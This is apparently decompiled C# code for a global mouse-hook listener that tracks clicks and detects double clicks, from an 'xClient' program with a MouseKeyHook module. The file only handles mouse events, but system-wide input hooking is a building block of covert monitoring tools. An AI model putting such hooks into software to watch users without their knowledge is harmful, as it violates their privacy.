using System;
using System.Windows.Forms;
using xClient.Core.MouseKeyHook.WinApi;

namespace xClient.Core.MouseKeyHook.Implementation
{
	// Token: 0x02000065 RID: 101
	internal class GlobalMouseListener : MouseListener
	{
		// Token: 0x060002BA RID: 698 RVA: 0x00003409 File Offset: 0x00001609
		public GlobalMouseListener() : base(new Subscribe(HookHelper.HookGlobalMouse))
		{
			this.m_SystemDoubleClickTime = MouseNativeMethods.GetDoubleClickTime();
		}

		// Token: 0x060002BB RID: 699 RVA: 0x00003428 File Offset: 0x00001628
		protected override void ProcessDown(ref MouseEventExtArgs e)
		{
			if (this.IsDoubleClick(e))
			{
				e = e.ToDoubleClickEventArgs();
			}
			base.ProcessDown(ref e);
		}

		// Token: 0x060002BC RID: 700 RVA: 0x00003444 File Offset: 0x00001644
		protected override void ProcessUp(ref MouseEventExtArgs e)
		{
			base.ProcessUp(ref e);
			if (e.Clicks == 2)
			{
				this.StopDoubleClickWaiting();
			}
			if (e.Clicks == 1)
			{
				this.StartDoubleClickWaiting(e);
			}
		}

		// Token: 0x060002BD RID: 701 RVA: 0x0000346F File Offset: 0x0000166F
		private void StartDoubleClickWaiting(MouseEventExtArgs e)
		{
			this.m_PreviousClicked = e.Button;
			this.m_PreviousClickedTime = e.Timestamp;
			this.m_PreviousClickedPosition = e.Point;
		}

		// Token: 0x060002BE RID: 702 RVA: 0x00003495 File Offset: 0x00001695
		private void StopDoubleClickWaiting()
		{
			this.m_PreviousClicked = MouseButtons.None;
			this.m_PreviousClickedTime = 0;
			this.m_PreviousClickedPosition = new Point(0, 0);
		}

		// Token: 0x060002BF RID: 703 RVA: 0x000034B2 File Offset: 0x000016B2
		private bool IsDoubleClick(MouseEventExtArgs e)
		{
			return e.Button == this.m_PreviousClicked && e.Point == this.m_PreviousClickedPosition && e.Timestamp - this.m_PreviousClickedTime <= this.m_SystemDoubleClickTime;
		}

		// Token: 0x060002C0 RID: 704 RVA: 0x000034EF File Offset: 0x000016EF
		protected override MouseEventExtArgs GetEventArgs(CallbackData data)
		{
			return MouseEventExtArgs.FromRawDataGlobal(data);
		}

		// Token: 0x0400010B RID: 267
		private readonly int m_SystemDoubleClickTime;

		// Token: 0x0400010C RID: 268
		private MouseButtons m_PreviousClicked;

		// Token: 0x0400010D RID: 269
		private Point m_PreviousClickedPosition;

		// Token: 0x0400010E RID: 270
		private int m_PreviousClickedTime;
	}
}
